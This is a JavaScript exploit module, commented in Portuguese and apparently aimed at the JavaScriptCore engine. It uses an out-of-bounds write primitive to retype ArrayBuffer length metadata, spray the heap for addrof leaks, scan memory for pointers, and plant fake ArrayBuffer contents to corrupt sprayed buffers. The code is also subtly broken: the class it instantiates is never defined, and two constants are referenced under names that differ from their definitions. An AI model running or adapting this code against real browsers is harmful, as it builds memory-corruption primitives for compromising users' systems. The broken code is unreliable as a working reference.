// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForMegaTest";
let getter_called_flag = false;
let current_test_results = { /* Objeto de resultados abrangente */ };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Constantes para metadados sombra
const SHADOW_DATA_PTR_CRASH = new AdvancedInt64(0x1, 0x0);
const SHADOW_SIZE_LARGE = new AdvancedInt64(0x7FFFFFF0, 0x0);
const SHADOW_DATA_PTR_NORMAL_OOB_AB_START = new AdvancedInt64(0x0, 0x0);
const OFFSET_SHADOW_CONTENTS_MAIN = 0x0; // Para re-tipagem do oob_ab
const OFFSET_SHADOW_CONTENTS_FOR_VICTIM = 0x300; // Para AB vítima pulverizado

class CheckpointForMegaTest {
    constructor(id) {
        this.id_marker = `MegaTestCheckpoint-${id}`;
        this.test_prop = "initial_checkpoint_prop_value";
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "MegaTest_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})! Iniciando bateria de testes agressivos...`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            overall_success: false, main_message: "Getter chamado, testes em andamento.",
            t1_retype_oob_ab: { success: false, details: "" },
            t2_addrof_spray: { success: false, leaks: [], details: "" },
            t3_snoop_oob_ab: { success: false, leaks: [], details: "" },
            t4_corrupt_sprayed_ab: { success: false, details: "" },
            t5_this_integrity: { details: `this.id_marker: ${this.id_marker}, this.test_prop: ${this.test_prop}` },
            error_in_getter: null
        };
        let sub_test_success = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.JSCell) {
                throw new Error("Dependências OOB ou Offsets ausentes no getter.");
            }
            const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;


            // --- Teste 1: Re-Tipagem de Length do oob_array_buffer_real ---
            logS3("GETTER (T1): Tentando Re-Tipagem Length oob_array_buffer_real...", "subtest", FNAME_GETTER);
            try {
                oob_write_absolute(OFFSET_SHADOW_CONTENTS_MAIN + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE_LARGE, 8);
                oob_write_absolute(OFFSET_SHADOW_CONTENTS_MAIN + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER_NORMAL_OOB_AB_START, 8);
                current_test_results.t1_retype_oob_ab.details = `Metadados sombra (size=${SHADOW_SIZE_LARGE.toString(true)}) plantados em oob_data[${toHex(OFFSET_SHADOW_CONTENTS_MAIN)}]. `;
                
                const reader_t1 = new Uint32Array(oob_array_buffer_real);
                current_test_results.t1_retype_oob_ab.details += `Uint32Array criado. Length: ${reader_t1.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}.`;
                if (reader_t1.length * 4 === SHADOW_SIZE_LARGE.low() && SHADOW_SIZE_LARGE.low() > oob_array_buffer_real.byteLength) {
                    current_test_results.t1_retype_oob_ab.success = true; sub_test_success = true;
                    current_test_results.t1_retype_oob_ab.details += " SUCESSO NA RE-TIPAGEM DE LENGTH!";
                    logS3(current_test_results.t1_retype_oob_ab.details, "vuln", FNAME_GETTER);
                } else {
                     current_test_results.t1_retype_oob_ab.details += ` Falha (Esperado ${SHADOW_SIZE_LARGE.low()/4}).`;
                }
            } catch (e1) { current_test_results.t1_retype_oob_ab.details += ` Erro: ${e1.message}.`; }


            // --- Teste 2: AddrOf Especulativo com Spray (Float64Array e Object Array) ---
            logS3("GETTER (T2): Tentando AddrOf com Spray...", "subtest", FNAME_GETTER);
            let t2_leaks_arr = [];
            try {
                const target_obj_t2 = { "addrof_target": Date.now() };
                const spray_count_t2 = 100;
                let float_readers_t2 = []; let obj_holders_t2 = [];
                const pattern_t2 = Math.SQRT2;
                for(let i=0; i<spray_count_t2; i++) {
                    let fa = new Float64Array(4); fa.fill(pattern_t2 + i); float_readers_t2.push(fa);
                    obj_holders_t2.push( (i === 50) ? [target_obj_t2] : [{idx:i}] );
                }
                for(let i=0; i<float_readers_t2.length; i++) {
                    for(let j=0; j<float_readers_t2[i].length; j++) {
                        if (float_readers_t2[i][j] !== (pattern_t2 + i)) {
                            const dv = new DataView(new ArrayBuffer(8)); dv.setFloat64(0, float_readers_t2[i][j], true);
                            t2_leaks_arr.push(`Float[${i}][${j}]!=pattern -> ${new AdvancedInt64(dv.getUint32(0,true), dv.getUint32(4,true)).toString(true)}`);
                        }
                    }
                }
                current_test_results.t2_addrof_spray.details = `Spray de ${spray_count_t2} arrays concluído.`;
                if (t2_leaks_arr.length > 0) {
                    current_test_results.t2_addrof_spray.success = true; sub_test_success = true;
                    logS3(`POTENCIAIS LEAKS ADDR_OF NO SPRAY: ${t2_leaks_arr.length}`, "vuln", FNAME_GETTER);
                }
            } catch (e2) { t2_leaks_arr.push(`Erro: ${e2.message}`); }
            current_test_results.t2_addrof_spray.leaks = t2_leaks_arr;


            // --- Teste 3: Sondagem Ampla do oob_array_buffer_real por Ponteiros Vazados ---
            logS3("GETTER (T3): Sondando oob_array_buffer_real (primeiros 512 bytes)...", "subtest", FNAME_GETTER);
            let t3_leaks_arr = [];
            try {
                const snoop_end_t3 = Math.min(0x200, oob_array_buffer_real.byteLength);
                for (let offset = 0; offset < snoop_end_t3; offset += 8) {
                    if (offset === CORRUPTION_OFFSET_TRIGGER) continue;
                    const val64 = oob_read_absolute(offset, 8);
                    if (!val64.equals(AdvancedInt64.Zero) && !val64.equals(CORRUPTION_VALUE_TRIGGER)) {
                        const val_str = val64.toString(true);
                        t3_leaks_arr.push(`${toHex(offset)}: ${val_str}`);
                        if (val64.high() > 0x1000 && val64.high() < 0x80000000) {
                             logS3(`PONTEIRO SUSPEITO em oob_data[${toHex(offset)}] = ${val_str}`, "leak", FNAME_GETTER);
                             current_test_results.t3_snoop_oob_ab.success = true; sub_test_success = true;
                        }
                    }
                }
                t3_leaks_arr.unshift(`Sondagem de ${toHex(snoop_end_t3)} bytes concluída.`);
            } catch (e3) { t3_leaks_arr.push(`Erro: ${e3.message}`); }
            current_test_results.t3_snoop_oob_ab.leaks = t3_leaks_arr;


            // --- Teste 4: Tentativa Agressiva de Corromper ArrayBuffer Pulverizado ---
            logS3("GETTER (T4): Tentando Corrupção Agressiva de AB Pulverizado...", "subtest", FNAME_GETTER);
            let t4_details = "";
            try {
                // Plantar Fake ArrayBufferContents (com data_ptr=0x1 para crash)
                oob_write_absolute(OFFSET_SHADOW_CONTENTS_FOR_VICTIM + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE_LARGE, 8);
                oob_write_absolute(OFFSET_SHADOW_CONTENTS_FOR_VICTIM + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER_CRASH, 8);
                t4_details = `FakeContents (ptr=0x1) plantados em oob_data[${toHex(OFFSET_SHADOW_CONTENTS_FOR_VICTIM)}]. `;

                let sprayed_abs_t4 = []; for(let i=0; i<30; i++) sprayed_abs_t4.push(new ArrayBuffer(64));
                t4_details += `Spray de ${sprayed_abs_t4.length} ABs (64 bytes) feito. `;

                // Tentar escrever o *offset* dos FakeContents em um local especulativo no oob_ab,
                // esperando que este local seja o m_impl de um sprayed_ab.
                const speculative_m_impl_target_offset = 0x100; // Offset dentro de oob_ab para tentar a escrita
                const value_for_m_impl = new AdvancedInt64(OFFSET_SHADOW_CONTENTS_FOR_VICTIM, 0);
                oob_write_absolute(speculative_m_impl_target_offset, value_for_m_impl, 8);
                t4_details += `Escrita especulativa em oob_data[${toHex(speculative_m_impl_target_offset)}] com ${value_for_m_impl.toString(true)}. `;

                let retyped_victim_found = false;
                for(let i=0; i<sprayed_abs_t4.length; i++){
                    try {
                        if (sprayed_abs_t4[i].byteLength === SHADOW_SIZE_LARGE.low()){
                            logS3(`SUCESSO T4! sprayed_abs_t4[${i}].byteLength é ${SHADOW_SIZE_LARGE.low()}!`, "vuln", FNAME_GETTER);
                            new DataView(sprayed_abs_t4[i]).getUint32(0,true); // Deve crashar lendo de 0x1
                            t4_details += ` sprayed_abs_t4[${i}] re-tipado (size OK) mas NÃO CRASHOU ao ler de 0x1!`;
                            retyped_victim_found = true; current_test_results.overall_success = true; break;
                        }
                    } catch (e_t4_check) {
                        if (sprayed_abs_t4[i] && sprayed_abs_t4[i].byteLength === SHADOW_SIZE_LARGE.low() && String(e_t4_check.message).toLowerCase().includes("rangeerror")) {
                             logS3(`SUCESSO T4! sprayed_abs_t4[${i}] re-tipado (size OK) E CRASH CONTROLADO ao ler de 0x1: ${e_t4_check.message}`, "vuln", FNAME_GETTER);
                            retyped_victim_found = true; current_test_results.overall_success = true; break;
                        }
                    }
                }
                t4_details += retyped_victim_found ? "Vítima re-tipada encontrada!" : "Nenhuma vítima re-tipada encontrada.";
            } catch (e4) { t4_details += `Erro: ${e4.message}`; }
            current_test_results.t4_corrupt_sprayed_ab.details = t4_details;
            if (current_test_results.t4_corrupt_sprayed_ab.details.includes("SUCESSO T4")) current_test_results.t4_corrupt_sprayed_ab.success = true;


            // --- Teste 5: Integridade do 'this' (checkpoint_obj) ---
             current_test_results.t5_this_integrity.details = `this.id_marker: ${this.id_marker}, this.test_prop: ${this.test_prop || 'N/A'}. Checkpoint obj parece estável.`;

            if (sub_test_success) { // Se qualquer sub-teste teve sucesso
                current_test_results.overall_success = true;
                current_test_results.message = "Bateria de testes CONCLUÍDA COM SUCESSO em um ou mais sub-testes!";
            } else {
                 current_test_results.message = "Bateria de testes concluída, sem sucesso óbvio.";
            }

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForMassiveAttack.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_massive_attack_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST_RUNNER = "executeMassiveAttackInGetterRunner";
    logS3(`--- Iniciando Bateria de Testes Agressivos no Getter ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* ... reset inicial ... */ };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || !JSC_OFFSETS.JSCell) {
        logS3("Offsets JSC críticos ausentes.", "critical", FNAME_TEST_RUNNER); return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { logS3("OOB Init falhou.", "critical", FNAME_TEST_RUNNER); return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForMassiveAttack(1);
        logS3(`CheckpointForMassiveAttack objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { logS3(`Erro em JSON.stringify: ${e.message}`, "error", FNAME_TEST_RUNNER); }

    } catch (mainError) {
        logS3(`Erro principal no runner: ${mainError.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError);
        current_test_results.message = `Erro crítico no runner: ${mainError.message}`;
        current_test_results.error = String(mainError);
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupRunner");
    }

    // Log dos resultados consolidados
    if (getter_called_flag) {
        logS3(`RESULTADO GERAL DA BATERIA DE TESTES: Success = ${current_test_results.overall_success}, Msg = ${current_test_results.message}`, current_test_results.overall_success ? "vuln" : "warn", FNAME_TEST_RUNNER);
        logS3(`  T1 (ReType OOB_AB): Success=${current_test_results.t1_retype_oob_ab.success}. ${current_test_results.t1_retype_oob_ab.details}`, "info", FNAME_TEST_RUNNER);
        logS3(`  T2 (AddrOf Spray): Success=${current_test_results.t2_addrof_spray.success}. Leaks: ${current_test_results.t2_addrof_spray.leaks.length > 1 ? current_test_results.t2_addrof_spray.leaks.length-1 : 0}`, "info", FNAME_TEST_RUNNER);
        current_test_results.t2_addrof_spray.leaks.forEach(l => logS3(`    ${l}`, "leak", FNAME_TEST_RUNNER));
        logS3(`  T3 (Snoop OOB_AB): Success=${current_test_results.t3_snoop_oob_ab.success}. Leaks: ${current_test_results.t3_snoop_oob_ab.leaks.length > 1 ? current_test_results.t3_snoop_oob_ab.leaks.length-1 : 0}`, "info", FNAME_TEST_RUNNER);
        current_test_results.t3_snoop_oob_ab.leaks.forEach(l => logS3(`    ${l}`, "leak", FNAME_TEST_RUNNER));
        logS3(`  T4 (Corrupt Sprayed AB): Success=${current_test_results.t4_corrupt_sprayed_ab.success}. ${current_test_results.t4_corrupt_sprayed_ab.details}`, "info", FNAME_TEST_RUNNER);
        logS3(`  T5 (This Integrity): ${current_test_results.t5_this_integrity.details}`, "info", FNAME_TEST_RUNNER);
        if (current_test_results.error_in_getter) logS3(`  Erro no Getter: ${current_test_results.error_in_getter}`, "error", FNAME_TEST_RUNNER);
    } else {
        logS3("RESULTADO BATERIA DE TESTES: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    logS3(`--- Bateria de Testes Agressivos no Getter Concluída ---`, "test", FNAME_TEST_RUNNER);
}
